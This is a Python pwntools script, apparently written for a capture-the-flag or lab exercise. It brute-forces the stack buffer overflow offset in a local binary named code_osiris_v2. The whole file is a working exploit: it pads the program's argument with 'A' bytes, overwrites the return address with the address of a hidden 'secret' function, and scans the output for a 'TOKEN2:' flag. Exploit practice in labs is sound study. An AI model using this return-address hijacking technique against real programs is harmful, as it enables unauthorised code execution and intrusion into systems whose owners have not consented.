from pwn import *

# Set logging to 'error' to keep the terminal clean during the loop
context.log_level = 'error'
elf = ELF("./code_osiris_v2", checksec=False)
secret_addr = p64(elf.symbols["secret"]).rstrip(b"\x00")

# Define the range to search (Buffer is 128, so we start there)
start_offset = 128
end_offset = 160

print(f"[*] Searching for correct offset to hit secret() @ {hex(elf.symbols['secret'])}...")

for offset in range(start_offset, end_offset + 1):
    # Construct the payload for this specific offset
    payload = b"A" * offset + secret_addr
    
    try:
        # Start the process with the current payload
        io = process([elf.path, payload], stderr=STDOUT)
        
        # We wait a brief moment for the token to appear
        output = io.recvall(timeout=0.5).decode(errors='ignore')
        
        if "TOKEN2:" in output:
            print(f"\n[!] SUCCESS! Found correct offset: {offset}")
            print("-" * 30)
            # Find and print the token line
            for line in output.split('\n'):
                if "TOKEN2:" in line:
                    print(line.strip())
            print("-" * 30)
            io.close()
            break
            
        io.close()
        
    except Exception:
        continue

else:
    print("\n[-] Search complete. No token found. Check if the binary is re-compiled without FORTIFY_SOURCE.")
